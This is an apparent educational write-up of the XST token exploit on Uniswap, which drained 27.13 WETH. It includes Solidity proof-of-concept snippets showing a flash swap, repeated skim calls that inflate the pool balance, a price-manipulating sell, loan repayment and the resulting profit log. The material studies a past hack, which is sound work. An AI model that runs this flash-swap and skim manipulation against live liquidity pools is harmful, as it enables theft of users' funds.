# XST

## What's XST?
XST is the platform's native cryptocurrency. Using XST, transaction validators acquire their rights to process transactions. These rights are tokenized as NFTs, movable assets known as StealthNodes, each of which is assigned a slot in a block validation schedule.

## Amount stolen
27.13 WETH


## Vulnerability
Skimming logic

## Analysis

The XST token on Uniswap was exploited through a combination of swapping, skimming, and manipulating the liquidity pool. The attacker initiated a flash swap, performed skimming operations to claim tokens, and manipulated prices by selling tokens back to the pool. This led to a significant profit in WETH for the attacker.

# Proof of concept (PoC) 

We check the balance of WETH within the XST pool on Uniswap and initiate a swap for twice that amount. This action triggers a callback, invoking our custom `uniswapV2Call` function.

```solidity
        amount = WETH.balanceOf(address(Pair2));
        Pair1.swap(amount * 2, 0, address(this), " ");
```


In our `uniswapV2Call` we proceed by getting the current reserves of the XST/WETH pair on Uniswap

![XTS Image](../images/XTS/label.drawio.png)



```solidity
uint256 amountSellWETH = WETH.balanceOf(address(this));
(uint256 reserve0, uint256 reserve1,) = Pair2.getReserves(); 
```

![XTS Image](../images/XTS/before.drawio.png)




### Calculate swap

To execute a swap on Uniswap, we adhere to the Uniswap formula, inserting the required parameters for swaps.
With the following parameters:

![XTS Image](../images/XTS/para1.drawio.png)

![XTS Image](../images/XTS/formula.drawio.png)
```solidity
  uint256 amountOutXST = amountSellWETH * 997 * reserve0 / (reserve1 * 1000 + amountSellWETH * 997);
```

Finally, swap the WETH tokens for XST tokens in the liquidity pool of Uniswap XST

```solidity
  WETH.transfer(address(Pair2), amountSellWETH);
  Pair2.swap(amountOutXST, 0, address(this), "");
```


### Skimming

The skim function in Uniswap V2 is used to claim accumulated tokens from a liquidity pool without removing liquidity. 
It's often used to retrieve additional tokens accumulated due to various operations, such as swaps.
   

```solidity
     XST.transfer(address(Pair2), XST.balanceOf(address(this)) / 8);   //(1/8th) of the XST balance held by the contract to the Uniswap pair, adding more liquidity to the pool.
        for (int256 i = 0; i < 15; i++) {
            Pair2.skim(address(Pair2));
        }

     Pair2.skim(address(this));
```


After skimming the tokens we sell the XST tokens to the WETH liquitiy pool, which allows us to manipulate the price within this flash swap.


```solidity
   XST.transfer(address(Pair2), XST.balanceOf(address(this)));
```

![XTS Image](../images/XTS/liq.drawio.png)

Now we repeat the previous steps with new values:

### Calculate swap

![XTS Image](../images/XTS/para2.drawio.png)



![XTS Image](../images/XTS/after.drawio.png)


```solidity
   uint256 amountOutWETH = amountSellXST * 997 * reserve1 / (reserve0 * 1000 + amountSellXST * 997);
```


### Swap for profit

```solidity
   Pair2.swap(0, amountOutWETH, address(this), "");
```


### Repay flashloan

```solidity
   WETH.transfer(address(Pair1), (amount * 2) * 1000 / 997 + 1000);
```




### Profit

Since we initiated the flash swap with 78 WETH, and at the end of the flash swap had 105 WETH, we were able to send the profit back to our wallet


![XTS Image](../images/XTS/profit.drawio.png)



```
  Attacker WETH profit before exploit: 0.000000000000000000
  Attacker WETH profit after exploit: 27.130181656842120567
```


## Conclusion

Because the XST tokens balance in the pool was increasing, while the reserves stayed the same, it caused the second swap to be manipulated in a way that led to extreme profits for the attacker.



**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/88mph_exp.sol)


[**< Back**](https://patronasxdxd.github.io/CTFS/)
